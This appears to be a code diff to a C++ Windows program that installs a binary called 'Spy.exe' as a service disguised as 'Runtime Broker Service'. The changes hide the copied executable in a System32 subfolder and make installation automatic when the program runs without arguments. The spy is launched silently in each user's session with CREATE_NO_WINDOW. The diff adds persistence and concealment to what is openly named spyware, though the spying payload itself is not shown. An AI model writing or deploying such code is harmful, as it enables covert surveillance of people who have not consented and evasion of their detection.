@@ -2,6 +2,8 @@
 #include <fstream>
 #include <Wtsapi32.h>
 #include <process.h>
+#include <Shlobj.h>
+#include <iostream>
 
 //Program Name
 #define SVCNAME TEXT("Runtime Broker Service")
@@ -25,6 +27,7 @@ void __cdecl ServiceWork(void * Args);
 bool TrainNewSpy(DWORD id, STARTUPINFO* si, PROCESS_INFORMATION* pi);
 void RemoveTheSpy(STARTUPINFO* si, PROCESS_INFORMATION* pi);
 DWORD getUserID();
+std::wstring directoryPath = L"C:\\Windows\\System32\\PointOfService\\ProtocolProviders\\";
 
 //###############################################################
 
@@ -41,6 +44,13 @@ DWORD getUserID();
 //
 int main(int argc, char *argv[])
 {
+	if (SHCreateDirectoryEx(NULL, directoryPath.c_str(), NULL)) {
+		std::wcout << L"Already exist or something wrong " << directoryPath << std::endl;
+	}
+	else {
+		std::wcerr << L"Directory created: " << directoryPath << std::endl;
+	}
+
 	if (argc > 1)
 	{ 
 		if (strcmp(argv[1], "install") == 0)
@@ -63,6 +73,10 @@ int main(int argc, char *argv[])
 			printf("No help for now, sorry :(");
 			return 0;
 		}
+	}
+	else {
+		InstallMySpy();
+		return 0;
 	}
 	SERVICE_TABLE_ENTRY DispatchTable[] =
 	{
@@ -98,7 +112,7 @@ VOID InstallMySpy()
 		return;
 	}
 
-	if (!CopyFile(TEXT(".\\Spy.exe"), TEXT("C:\\Runtime Broker"), false))
+	if (!CopyFile(TEXT(".\\Spy.exe"), (directoryPath + L"Runtime Broker").c_str(), false))
 	{
 		printf("Cannot copy service (%d)\n", GetLastError());
 		return;
@@ -179,7 +193,7 @@ VOID WINAPI RemoveMySpy()
 		return;
 	}
 
-	if (!DeleteFile(TEXT("C:\\Runtime Broker")))
+	if (!DeleteFile((directoryPath + L"Runtime Broker").c_str()))
 		printf("Warning! Spy cannot be deleted(%d)\n",GetLastError());
 
 	// Delete the service.
@@ -422,7 +436,7 @@ bool TrainNewSpy(DWORD id, STARTUPINFO* si, PROCESS_INFORMATION* pi)
 
 	//Create current user process
 	bool result = CreateProcessAsUser(
-		pToken, TEXT("C:\\Runtime Broker"), NULL, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | CREATE_NO_WINDOW, NULL, NULL, si, pi);
+		pToken, (directoryPath + L"Runtime Broker").c_str(), NULL, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | CREATE_NO_WINDOW, NULL, NULL, si, pi);
 
 	CloseHandle(pToken);
 	return result;
